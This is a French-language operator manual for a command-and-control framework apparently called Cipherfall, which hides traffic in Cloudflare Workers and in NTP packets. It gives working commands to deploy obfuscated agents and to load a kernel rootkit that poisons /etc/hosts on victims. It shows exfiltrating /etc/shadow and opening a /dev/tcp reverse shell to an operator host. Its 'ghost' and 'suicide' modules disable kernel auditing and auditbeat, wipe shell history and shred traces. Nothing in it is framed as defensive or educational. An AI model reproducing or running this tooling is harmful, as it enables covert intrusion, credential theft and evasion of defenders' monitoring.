# Manuel de déploiement — Cipherfall C2

Deux canaux C2 indépendants. Même interface opérateur (`operator_cli.py`).

---

## Vue d'ensemble

```
                    ┌─────────────────────────────────────┐
                    │           OPÉRATEUR                 │
                    │  operator_cli.py / tui.py           │
                    │  (machine locale, pas de port ouvert)│
                    └───────────┬─────────────────────────┘
                                │ admin API (localhost)
                    ┌───────────▼─────────────────────────┐
                    │           SERVEUR C2                │
                    │  cloudflare-worker/server.py        │  ← canal 1
                    │        ou                           │
                    │  ntp/server.py                      │  ← canal 2
                    └───────────┬─────────────────────────┘
                                │
              ┌─────────────────┼───────────────────┐
              │ Canal 1         │                   │ Canal 2
              ▼                 │                   ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │ Cloudflare KV   │          │        │  UDP/123 ou      │
   │ (dead-drop)     │          │        │  TCP/443         │
   └────────┬────────┘          │        └────────┬─────────┘
            │                   │                 │
            ▼                   │                 ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │   AGENT         │          │        │   AGENT NTP      │
   │ (victime, HTTP) │          │        │ (victime, UDP)   │
   └─────────────────┘          │        └──────────────────┘
```

| | Canal Cloudflare Worker | Canal NTP |
|---|---|---|
| Transport | HTTPS/443 vers Cloudflare | UDP/123 (fallback TCP/443) |
| Infrastructure | Cloudflare Workers + KV | VPS avec IP publique |
| Détection réseau | Très difficile (trafic HTTPS normal) | NTP légitime (paquets NTS Cookie) |
| Prérequis victime | Accès HTTPS outbound | `/etc/hosts` compromis + UDP/123 outbound |
| Persistance tâches | KV Cloudflare (TTL 1h) | Aucune (UDP fire-and-forget) |

---

## Canal 1 — Cloudflare Worker

### Architecture

```
  OPÉRATEUR                SERVEUR C2               CLOUDFLARE              VICTIME
  (laptop)                 (laptop/VPS)              (Worker KV)             (cible)

  operator_cli.py ──POST──► server.py
                            [pending]
                                │
                                │ PUT /task/{agent_id}
                                ▼
                            server.py ◄──────────────► worker.js
                            [sent]                      KV: task:{id}
                                                            │
                                                            │ GET /task/{id}
                                                            ▼
                                                        nullrelay.py
                                                        [exécute cmd]
                                                            │
                                                            │ PUT /result/{task_id}
                                                            ▼
                            server.py ◄─────────────── worker.js
                            [done]                      KV: result:{id}
                                │
  operator_cli.py ◄──GET──── server.py
  [output affiché]
```

### Étape 1 — Déployer le Worker Cloudflare

```bash
cd Modules/C2/cloudflare-worker

# 1. Installer wrangler
npm install -g wrangler
wrangler login

# 2. Créer le namespace KV
wrangler kv:namespace create "C2_KV"
# → copier l'id retourné dans wrangler.toml :
#   id = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

# 3. Calculer le token partagé (même PSK que le serveur)
python3 -c "
import hashlib, hmac
PSK = 'mon_mot_de_passe_secret'
token = hmac.new(PSK.encode(), b'worker_token', hashlib.sha256).hexdigest()[:32]
print('WORKER_SECRET =', token)
"

# 4. Injecter le secret dans le Worker
wrangler secret put WORKER_SECRET
# → coller la valeur calculée ci-dessus

# 5. Déployer
wrangler deploy
# → noter l'URL : https://cipherfall-c2.XXXX.workers.dev
```

### Étape 2 — Démarrer le serveur C2

```bash
cd Modules/C2/cloudflare-worker
pip install -r requirements.txt

WORKER_URL=https://cipherfall-c2.XXXX.workers.dev \
C2_PSK=mon_mot_de_passe_secret \
python3 server.py

# Sortie attendue :
# [*] C2 server started
# [*] Admin API on http://127.0.0.1:1337
# [*] Polling Worker every 10s
```

> Le serveur n'expose aucun port public. Toute la communication passe par Cloudflare.

### Étape 3 — Préparer et déployer l'agent

```bash
# Récupérer l'ID de l'agent sur la cible
python3 nullrelay.py --id
# → ex: 3685e93ab6597954b51d83969dd4f1ad

# Générer un agent personnalisé via la TUI
cd Modules/C2
WORKER_URL=https://... C2_PSK=... python3 tui.py
# → onglet "Payload" → sélectionner "cloudflare" → remplir WORKER_URL et PSK → "Generate"
# → optionnel : cocher "Obfuscate" pour passer par shadowscript.py

# OU manuellement : éditer les variables en tête de nullrelay.py puis obfusquer
python3 ../../Obfuscator/shadowscript.py nullrelay.py
# → déployer le fichier obfusqué sur la cible
```

### Étape 4 — Opérer

```bash
# Voir les agents connectés
C2_ADMIN_PORTS=1337 python3 ../operator_cli.py agents

# Envoyer une commande (préfixe d'ID = 4 chars min)
python3 ../operator_cli.py task 3685 "id && hostname"

# Attendre et récupérer le résultat
python3 ../operator_cli.py wait <task_id>

# Exfiltrer un fichier
python3 ../operator_cli.py task 3685 "UPLOAD:/etc/shadow"
python3 ../operator_cli.py wait <task_id>
```

---

## Canal 2 — NTP C2

### Architecture

```
                         /etc/hosts (compromis par rootkit)
  0.debian.pool.ntp.org  ──────────────────────► 87.106.187.97
                                                  (VPS C2)

  VICTIME                                          SERVEUR C2
  clockvenom.py                                    ntp/server.py

  1. résoud le domaine NTP                         UDP/123
     → obtient l'IP du VPS (via /etc/hosts)    ┌──────────┐
  2. envoie beacon NTP Mode-3                   │ NTP pkt  │
     ┌──────────────────────────────────────────►  Mode-3  │
     │  NTP header (48B)                        │  + ext   │
     │  + NTS Cookie field (type 0x0104)        └────┬─────┘
     │    └── AES-256-GCM(zlib(JSON beacon))         │
     │                                               │ tâche en attente ?
     │  NTP header (48B)                        ┌────▼─────┐
     └──────────────────────────────────────────┤  NTP pkt │
        + NTS Cookie field (si tâche présente)  │  Mode-4  │
          └── AES-256-GCM(zlib(JSON task))      └──────────┘

  Fallback : si UDP/123 bloqué → TCP/443 (même format, longueur préfixée)
```

### Prérequis

- **VPS** avec IP publique, accès root, UDP/123 et TCP/443 ouverts
- **Rootkit chargé sur la cible** : le rootkit injecte les entrées NTP dans `/etc/hosts`
  et les cache de tout processus sauf l'agent C2 (comm `ntp-agent`)

```
# Vérifier que le rootkit a injecté les entrées (bypass read hook via mmap)
python3 -c "
import mmap
f = open('/etc/hosts', 'rb')
m = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
print(m[:].decode())
" | grep 87.106
```

### Étape 1 — Démarrer le serveur NTP C2

```bash
# Sur le VPS (nécessite root pour bind UDP/123 et TCP/443)
cd /opt/cipherfall/ntp_c2
pip install -r requirements.txt

C2_PSK=mon_mot_de_passe_secret python3 server.py

# Sortie attendue :
# [*] NTP C2 listening on UDP/123 + TCP/443
# [*] Admin API on http://127.0.0.1:1338

# En arrière-plan :
C2_PSK=... nohup python3 server.py > /var/log/ntp_c2.log 2>&1 &

# Debug (affiche chaque beacon/dispatch) :
C2_PSK=... C2_DEBUG=1 python3 server.py
```

> Port admin par défaut : **1338** (différent du canal Cloudflare : 1337)

### Étape 2 — Déployer l'agent sur la cible

```bash
# Sur la CIBLE — s'assurer que le rootkit est chargé
cd /tmp/rb && insmod ironveil.ko

# Vérifier que le domaine NTP résoud bien vers le VPS
# (en se nommant ntp-agent pour bypasser le filtre du rootkit)
python3 -c "
import socket, ctypes
ctypes.CDLL('libc.so.6').prctl(15, b'ntp-agent', 0, 0, 0)
print(socket.gethostbyname('0.debian.pool.ntp.org'))
"
# doit afficher l'IP du VPS

# Récupérer l'ID agent
python3 /tmp/clockvenom.py --id

# Lancer l'agent (beacon toutes les ~60s ± 30s)
C2_PSK=mon_mot_de_passe_secret python3 /tmp/clockvenom.py

# Intervalle court pour les tests
C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/clockvenom.py > /tmp/clockvenom.log 2>&1 &
```

### Étape 3 — Opérer

```bash
# Depuis le VPS ou via SSH tunnel vers le VPS
# Port admin NTP C2 = 1338

# Voir les agents
C2_ADMIN_PORTS=1338 python3 operator_cli.py agents

# Envoyer une commande
C2_ADMIN_PORTS=1338 python3 operator_cli.py task 3685 "id && uname -r"

# Attendre le résultat (l'agent doit faire un nouveau beacon)
C2_ADMIN_PORTS=1338 python3 operator_cli.py wait <task_id>
```

---

## Interface opérateur (operator_cli.py)

Fonctionne avec les deux canaux. Changer le port selon le canal.

```
┌─────────────────────────────────────────────────────────────────┐
│  COMMANDE                         DESCRIPTION                   │
├─────────────────────────────────────────────────────────────────┤
│  agents                           liste les agents vus          │
│  tasks                            liste toutes les tâches       │
│  task <id_prefix> <cmd>           envoie une commande           │
│  result <task_id>                 lit le résultat               │
│  wait <task_id>                   attend + affiche le résultat  │
│  register <agent_id> [label]      enregistre un agent           │
└─────────────────────────────────────────────────────────────────┘

Variables d'environnement :
  C2_ADMIN_PORTS=1337        (Cloudflare uniquement)
  C2_ADMIN_PORTS=1338        (NTP uniquement)
  C2_ADMIN_PORTS=1338,1337   (les deux, défaut TUI)
```

Exemples :

```bash
# Exfiltrer /etc/passwd
python3 operator_cli.py task 3685 "UPLOAD:/etc/passwd"
python3 operator_cli.py wait <task_id> | base64 -d

# Reverse shell (listener sur 4444 côté opérateur)
python3 operator_cli.py task 3685 "bash -i >& /dev/tcp/MON_IP/4444 0>&1"
```

---

## TUI — tableau de bord interactif (commun aux deux canaux)

Lance automatiquement sur les deux canaux (lit `.env` dans le même dossier) :

```bash
cd Modules/C2
python3 tui.py
```

Variables `.env` utilisées : `C2_ADMIN_PORTS` (défaut `1338,1337`), `WORKER_URL`, `C2_PSK`, `C2_HOST`.

```
┌──────────────────────────────────────────────────────┐
│  [ Agents ]  [ Graphe ]  [ Payload ]                 │
├──────────────────────────────────────────────────────┤
│  ID           Label        Dernière activité         │
│  3685e93a     debian-vm    il y a 12s   (NTP)        │
│  120ae267     my-laptop    il y a 3 min (CF)         │
├──────────────────────────────────────────────────────┤
│  > commande : _                                      │
└──────────────────────────────────────────────────────┘
  r = refresh   d = supprimer agent   q = quitter
```

### Onglet Graphe

Arbre ASCII représentant la topologie C2 en temps réel. Auto-refresh toutes les 5 s.

```
╭──────────────────────────────────────────────╮
│  ◉  C2 SERVER  127.0.0.1:1337               │
│  2 active  ·  1 offline                      │
╰──────────────────────────────────────────────╯

├── ● 3685e93a  debian-vm    relay:443   (CF)
│     └── ● 9a1fc221  lateral-1   via relay  (CF)
└── ◆ a0b2c3d4  ntp-target              (NTP)

── offline ────────────────────────────────────
    ✕ dead1234  old-host    last: 8 min ago
```

Règles de placement :
- **Relay node** (`relay_port > 0`) : placé en Layer-1, ses fils (agents dont `WORKER_URL` pointe vers l'IP:port du relay) sont affichés en dessous.
- **Direct agents** : connectés directement au Worker Cloudflare ou au serveur NTP.
- **Orphelins** : agent avec un `WORKER_URL` différent → rattaché au relay qui correspond, sinon affiché seul en Layer-1.
- **Dead** : agent inactif depuis plus de `max(beacon_int × 5, 30)` secondes → section offline séparée.

### Onglet Payload

Génère un agent Python prêt à déployer avec les constantes baked dedans.

| Champ | Description |
|---|---|
| AGENT TYPE | `cloudflare` → `nullrelay.py` / `ntp` → `clockvenom.py` |
| WORKER URL | URL du Worker CF (cloudflare uniquement) |
| C2 PSK | Clé partagée — doit correspondre au serveur |
| BEACON (s) | Intervalle de beacon (bake en `C2_INT`) |
| JITTER (s) | Jitter aléatoire ±N secondes (bake en `C2_JITTER`) |
| VIA RELAY | Active les champs relay ci-dessous |
| RELAY PORT | (CF) port TCP du relay — bake en `RELAY_PORT` |
| RELAY HOST | (NTP) IP du relay — bake en `C2_DIRECT`, bypass DNS |
| RELAY PORT | (NTP) port TCP du relay — bake en `TCP_PORT` |
| OBFUSCATION | Passe l'agent par `shadowscript.py` après bake |
| OUTPUT FILE | Chemin de sortie (relatif à `Modules/C2/`) |

Cliquer **GENERATE PAYLOAD** écrit le fichier baked (et obfusqué si activé) sur disque. Le chemin final est affiché dans la statusbar.

> **Option VIA RELAY (NTP)** : bake `C2_DIRECT=<relay_host>` dans clockvenom.py — l'agent se connecte directement à cette IP sans résoudre le domaine NTP. Utile si `/etc/hosts` n'est pas encore compromis mais qu'un relay est accessible.

### Commandes spéciales (`/module`)

Saisir dans le champ de commande avec un agent sélectionné.

#### `/module relay [start [port]]`

Ouvre un tunnel TCP de retour vers le C2.

```
/module relay              # démarre le relay sur le port par défaut
/module relay start 8443   # port personnalisé
```

- **Agent CF (NullRelay)** : ouvre un tunnel TCP sur le port spécifié (défaut 443) vers le Worker.
- **Agent NTP (ClockVenom)** : ouvre un listener TCP local sur le port spécifié (défaut 123) qui forward vers `C2_HOST:443`. Supprime la limite de taille UDP/123 pour les commandes suivantes.

#### `/module upload <local_path> [remote_path]`

Envoie un fichier de la machine opérateur vers l'agent.

```
/module upload /tmp/exploit.py                  # → dépose dans /tmp/exploit.py sur la cible
/module upload /tmp/exploit.py /opt/exp.py      # chemin distant personnalisé
```

Mécanisme : lit le fichier localement, base64-encode, envoie `echo '<b64>' | base64 -d > <remote_path>` comme commande shell à l'agent.

Limite pratique : ~quelques MB (plafond CF Workers 100 MB). Pour de gros binaires, démarrer `/module relay` d'abord.

#### `/module download <remote_path> [local_path]`

Récupère un fichier depuis l'agent vers la machine opérateur.

```
/module download /etc/shadow                    # → sauvegardé dans downloads/shadow
/module download /etc/shadow /tmp/shadow.txt    # chemin local personnalisé
```

Le comportement diffère selon le type d'agent :

**Agent CF (NullRelay)** : envoie la commande `UPLOAD:<remote_path>` ; l'agent lit le fichier en binaire et retourne la base64 complète. Pas de limite de taille (plafond CF 100 MB). Un seul aller-retour.

**Agent NTP (ClockVenom)** : protocole en deux phases, automatique et transparent :

```
Phase 1 — count task
  TUI envoie : python3 -c "...gzip.compress(mtime=0)...print(nb_chunks)"
  Agent répond : N  (nombre de chunks nécessaires)

Phase 2 — N chunk tasks
  TUI envoie tâche i : python3 -c "...b64[i*550:(i+1)*550]..."
  Agent répond : 550 chars de base64 gzippé

Réassemblage (boucle de collecte, toutes les 5s) :
  concat → base64decode → gzip.decompress → écriture fichier
```

Débit approximatif (C2_INT=30s) :

| Type de fichier | Chunks (ex. 10 KB) | Temps estimé |
|---|---|---|
| Texte / scripts (ratio gzip ×8) | ~4 | ~2 min |
| Binaires (ratio gzip ×1.3) | ~25 | ~12 min |
| `/etc/passwd` ~2 KB | 2 | ~1 min |

> Pour tout fichier > ~50 KB sur agent NTP : lancer `/module relay` d'abord, puis utiliser `/module download` — le relay supprime la limite UDP et le fichier passe en un seul aller-retour (~30s).

Les tâches de chunks sont visibles dans la liste des tâches. Cliquer sur une tâche chunk affiche sa progression (`chunk X/N, Y reçus`). Le log se met à jour automatiquement quand le téléchargement est terminé.

#### `/module recon [--obfuscate] [--delayer INT JITTER] [--renamer]`

Exécute `phantom_eye.sh` sur l'agent. Toutes les options sont opt-in et se cumulent.

```
/module recon                                      # envoi brut
/module recon --obfuscate                          # obfusqué via shadowscript
/module recon --delayer 0.5 0.2                    # delays aléatoires entre les lignes
/module recon --renamer                            # renomme le script avec un nom plausible
/module recon --obfuscate --delayer 0.5 0.2 --renamer  # tout activé
```

Ordre d'application : delayer → obfuscate → renamer.

Le script est base64-encodé et envoyé inline à l'agent :

```bash
echo '<b64>' | base64 -d > /tmp/.<hex8> && bash /tmp/.<hex8>; rm -f /tmp/.<hex8>
```

Sortie attendue : une ligne semicolon-delimited (format Phantom Eye) :

```
Ubuntu;22.04;5.15.0-127-generic;share1,share2;/export/nfs;my-bucket;mydb;;N/A;N/A
```

Durée d'exécution : ~10–30 s (phantom_eye sonde de nombreux services avec fallbacks).

#### `/module ghost on|off|status`

Active/désactive le mode fantôme sur **l'agent sélectionné uniquement** (état isolé par process).

```
/module ghost on       # active
/module ghost off      # désactive
/module ghost status   # affiche l'état courant
```

Quand actif, chaque commande shell suivante est wrappée avec le préambule EchoErase :

1. `auditctl -e 0` — coupe l'audit kernel (root requis)
2. `systemctl stop auditbeat` — stoppe auditbeat si présent
3. Zeroing des variables d'historique shell (`HISTFILE=/dev/null`, `HISTSIZE=0`, etc.)
4. Unset des empreintes SSH/sudo/terminal (`SSH_CLIENT`, `SUDO_USER`, variables d'émulateur)
5. Neutralisation de snoopy (`LD_PRELOAD` vidé si snoopy détecté)
6. `ulimit -c 0` — désactive les core dumps
7. Restauration de l'audit et auditbeat après exécution

Les commandes `UPLOAD:` et `WRITE:` ne sont **pas** wrappées (opérations fichier, pas shell).

Persiste jusqu'à `/module ghost off` ou redémarrage de l'agent.

#### `/module heartbeat INT JITTER`

Modifie l'intervalle de beacon de l'agent à la volée, sans redémarrage.

```
/module heartbeat 60 15     # beacon toutes les 60s ± 15s
/module heartbeat 5 2       # mode agressif pour tests
/module heartbeat status    # affiche l'intervalle courant
```

Prend effet dès le prochain cycle de sleep. Utile pour ralentir un agent une fois une tâche longue lancée, ou accélérer temporairement pour récupérer un résultat rapidement.

#### `/module suicide`

Auto-destruction de l'agent et effacement des traces sur la cible. Affiche une confirmation avant d'envoyer.

```
/module suicide    # demande confirmation → envoie la commande → auto-supprime de la DB
```

Séquence d'exécution sur l'agent (2 s après envoi de `[suicide: ok]`) :

1. `auditctl -e 0` — coupe l'audit kernel
2. Zeroing des variables d'historique shell
3. `shred -u <agent.py>` (fallback `rm -f`) — supprime le script agent
4. `rm -rf <agent.pyc> __pycache__/` — supprime le bytecode compilé
5. Shred/rm de `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.history`
6. `find /tmp -maxdepth 1 -name '.*' -user $(id -nu) -delete` — supprime les scripts recon laissés dans `/tmp`
7. `kill <pid>` — termine le process agent

Côté TUI : dès réception de `[suicide: ok]`, l'agent est automatiquement supprimé de la base SQLite et du heartbeat Cloudflare (équivalent à `d`).

> Root recommandé pour `shred` et `auditctl`. Sans root, `rm -f` remplace `shred` (pas d'écrasement sécurisé) et l'audit n'est pas coupé.

---

## Checklist de déploiement rapide

### Canal Cloudflare Worker

```
[ ] wrangler deploy (worker.js + secret WORKER_SECRET)
[ ] WORKER_URL noté
[ ] pip install -r cloudflare-worker/requirements.txt
[ ] WORKER_URL=... C2_PSK=... python3 cloudflare-worker/server.py
[ ] Agent baked avec TUI ou manuellement, obfusqué, déployé sur cible
[ ] python3 operator_cli.py agents  → agent visible
```

### Canal NTP

```
[ ] Rootkit chargé sur la cible (insmod ironveil.ko)
[ ] Vérifier injection /etc/hosts via mmap
[ ] VPS : UDP/123 + TCP/443 ouverts dans firewall
[ ] C2_PSK=... python3 ntp/server.py  (sur VPS, root)
[ ] C2_PSK=... C2_INT=15 python3 /tmp/clockvenom.py  (sur cible)
[ ] C2_ADMIN_PORTS=1338 python3 operator_cli.py agents  → agent visible
```

---

## Dépannage

| Symptôme | Cause probable | Correction |
|---|---|---|
| Agent absent de la liste | PSK différent entre agent et serveur | Vérifier `C2_PSK` des deux côtés |
| Tâche reste `sent` | Agent ne beacon pas / tâche perdue | Vérifier que l'agent tourne, re-queue la tâche |
| NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod ironveil.ko`, vérifier via mmap |
| NTP : beacon timeout | UDP/123 bloqué ET TCP/443 bloqué | Vérifier firewall VPS et NAT victime |
| NTP : download incomplet / corrompu | Fichier trop grand pour UDP (> ~650B raw) | Utiliser `/module relay` puis relancer `/module download` |
| Cloudflare : 404 sur Worker | WORKER_SECRET incorrect | Recalculer token avec même PSK |
